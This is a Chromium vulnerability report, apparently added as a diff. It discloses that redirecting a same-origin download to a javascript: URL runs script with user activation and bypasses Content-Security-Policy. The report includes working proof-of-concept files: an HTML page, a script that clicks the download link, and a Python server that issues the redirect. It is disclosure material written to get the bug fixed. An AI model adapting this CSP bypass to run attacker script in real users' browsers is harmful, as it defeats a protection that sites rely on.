@@ -1,0 +1,70 @@
+VULNERABILITY DETAILS
+When redirecting a same-origin download to a javascript: URL, the code that runs has user activation and bypasses CSP.
+This issue was found as part of https://bugs.chromium.org/p/chromium/issues/detail?id=966914.
+VERSION
+Chrome Version: Tested on 74.0.3729.169 (stable) and 76.0.3804.1 (canary)
+Operating System: Windows 10 Pro, version 1809
+REPRODUCTION CASE
+The attached files form a simple website. To begin with, download each of the files and place them in a directory.
+In the directory you downloaded the files to, run the following command in a terminal:
+python3 server.py 8080
+This will start a simple web server that can be used to serve the files in the directory. server.py is necessary here, as it firstly redirects requests received for download.txt:
+if self.path == '/download.txt':
+self.send_response(302)
+self.send_header('Location', "javascript: window.open()")
+self.end_headers()
+This is important in step 4 below, where a download for this file will be initiated.
+Secondly, it sets the following Content-Security-Policy header:
+Content-Security-Policy: script-src 'self';
+In the browser, navigate to the following location:
+http://localhost:8080/index.html
+This page has a single link:
+<a href="download.txt" id="download-link" download></a>
+10 seconds after the page loads, JavaScript will click the link. When this happens, server.py will redirect the request received for download to the following javascript: URL:
+javascript: window.open()
+The window.open call here should fail, given that the page has had no user interaction. Instead, it succeeds.
+This demonstrates two things: (1) that the script has user activation (otherwise the window.open call would fail) and (2) that CSP is bypassed (as an inline javascript: URL is executed, even though a "script-src" of "self" is used).
+From debugging through the code, a same-origin download redirected to a javascript: URL is ultimately passed through the following function:
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/frame/web_local_frame_impl.cc?l=2055&rcl=fe24d6713f507dd7e4ff407a1ef769e07abef734
+As can be seen, this function grants user activation and sets a flag indicating CSP should be ignored. So it appears that this is the direct cause of the issue.
+CREDIT INFORMATION
+Reporter credit: David Erceg
+With attachment: index.html
+<!doctype html>
+<html>
+    <head>
+        <script type="text/javascript" src="main.js"></script>
+    </head>
+    <body>
+        <a href="download.txt" id="download-link" download></a>
+    </body>
+</html>
+
+With attachment: main.js
+window.addEventListener("load", function onLoad(event) {
+    setTimeout(() => {
+        var downloadLink = document.getElementById("download-link");
+        downloadLink.click();
+    }, 10000);
+});
+
+With attachment: server.py
+#!/usr/bin/env python3
+from http.server import HTTPServer, SimpleHTTPRequestHandler, test
+import sys
+
+class CustomHTTPRequestHandler (SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/download.txt':
+            self.send_response(302)
+            self.send_header('Location', "javascript: window.open()")
+            self.end_headers()
+        else:
+            SimpleHTTPRequestHandler.do_GET(self)
+
+    def end_headers (self):
+        self.send_header('Content-Security-Policy', "script-src 'self';")
+        SimpleHTTPRequestHandler.end_headers(self)
+
+if __name__ == '__main__':
+    test(CustomHTTPRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
